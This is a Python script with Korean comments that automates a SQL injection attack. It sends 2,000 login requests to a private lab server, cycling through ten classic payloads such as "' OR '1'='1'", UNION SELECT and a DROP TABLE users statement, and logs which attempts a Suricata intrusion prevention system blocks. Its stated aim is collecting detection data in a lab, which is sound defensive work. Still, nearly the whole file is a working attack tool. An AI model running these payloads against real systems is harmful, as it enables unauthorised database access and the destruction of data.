import requests
import time
import requests
import time

# ==========================================
# 1. 설정값 (환경에 맞춰 수정하세요)
# ==========================================
TARGET_URL = "http://192.168.2.100:5000/login"
TOTAL_ATTACKS = 2000  # 총 시도 횟수
ATTACK_LOG = "sql_injection_blocked.log"

# 수리카타가 탐지할 전형적인 SQL 인젝션 패턴들
base_payloads = [
    "' OR '1'='1'",
    "admin' --",
    "' UNION SELECT NULL, NULL --",
    "'; DROP TABLE users; --",
    "' OR 1=1 LIMIT 1 --",
    "admin' AND 1=1",
    "' AND 'a'='a'",
    "') OR 1=1 --",
    "admin'#",
    "' OR 'any'='any'"
]

def run_attack():
    print(f"[*] SQL 인젝션 데이터 수집 시작 (목표: {TOTAL_ATTACKS}개)")
    print(f"[*] 타겟: {TARGET_URL}")
    print("-" * 50)

    success_count = 0
    blocked_count = 0

    # 로그 파일을 '추가(a)' 모드로 열기
    with open(ATTACK_LOG, "a") as f:
        for i in range(1, TOTAL_ATTACKS + 1):
            # 패턴 순환 및 고유 식별자 추가 (데이터 다양성 확보)
            payload = base_payloads[i % len(base_payloads)]
            unique_payload = payload + f" /* seq_{i} */"
            
            data = {"username": unique_payload, "password": "password123"}
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

            try:
                # 공격 수행 (IPS 차단을 감지하기 위해 타임아웃 2초 설정)
                response = requests.post(TARGET_URL, data=data, timeout=2)
                
                # 서버까지 도달한 경우 (정상 응답 혹은 401 Unauthorized 등)
                log_entry = f"[{timestamp}] {unique_payload} | Status: {response.status_code}\n"
                success_count += 1

            except requests.exceptions.Timeout:
                # IPS가 패킷을 Drop하여 응답이 오지 않는 경우 (핵심 데이터)
                log_entry = f"[{timestamp}] {unique_payload} | Status: Blocked/Dropped\n"
                blocked_count += 1
                # 실시간 확인을 위해 터미널에도 출력 (선택 사항)
                # print(f"[!] {i}: 차단됨 (Timeout)")

            except Exception as e:
                # 기타 네트워크 에러
                log_entry = f"[{timestamp}] {unique_payload} | Status: Error({e})\n"

            # 로그 파일에 즉시 기록
            f.write(log_entry)

            # 50개마다 진행 상황 출력
            if i % 50 == 0:
                progress = (i / TOTAL_ATTACKS) * 100
                print(f"[+] {i}/{TOTAL_ATTACKS} 완료... (진행률: {progress:.1f}%) | 차단됨: {blocked_count}")

            # 서버 부하 방지 및 수리카타 로그 생성 시간 확보
            time.sleep(0.05)

    print("-" * 50)
    print(f"[*] 수집 종료! 총 {success_count + blocked_count}개의 데이터가 '{ATTACK_LOG}'에 저장되었습니다.")
    print(f"[*] 통과된 패킷: {success_count} | 차단된 패킷: {blocked_count}")

if __name__ == "__main__":
    run_attack()
